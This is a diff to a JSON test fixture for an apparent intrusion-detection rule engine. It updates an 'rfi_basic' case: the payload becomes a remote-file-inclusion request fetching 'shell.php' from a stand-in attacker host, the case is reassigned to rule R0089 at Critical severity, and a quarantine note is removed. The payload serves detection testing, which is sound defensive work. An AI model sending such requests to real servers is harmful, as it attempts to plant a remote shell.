@@ -115,21 +115,19 @@
       "name": "rfi_basic",
       "description": "Remote file inclusion attempt",
       "category": "RFI",
-      "expected_severity": "High",
-      "expected_rule_id": "R0088",
+      "expected_severity": "Critical",
+      "expected_rule_id": "R0089",
       "expected_tier": "Tier-1",
       "event": {
         "attack_type": "RFI_BASIC",
         "src_ip": "10.0.0.11",
         "dst_port": 80,
-        "payload": "http://evil.com/shell.php",
+        "payload": "GET /vuln.php?file=http://evil.com/shell.php HTTP/1.1",
         "protocol": "TCP",
-        "severity": "High",
+        "severity": "Critical",
         "policy": "Block",
-        "rule_id": "R0088"
-      },
-      "quarantined": true,
-      "quarantine_reason": "payload never matches R0088 (path-traversal rule) by match_pattern or regex; RFI needs a dedicated rule (rule-owner verdict pending)"
+        "rule_id": "R0089"
+      }
     },
     {
       "name": "port_scan",
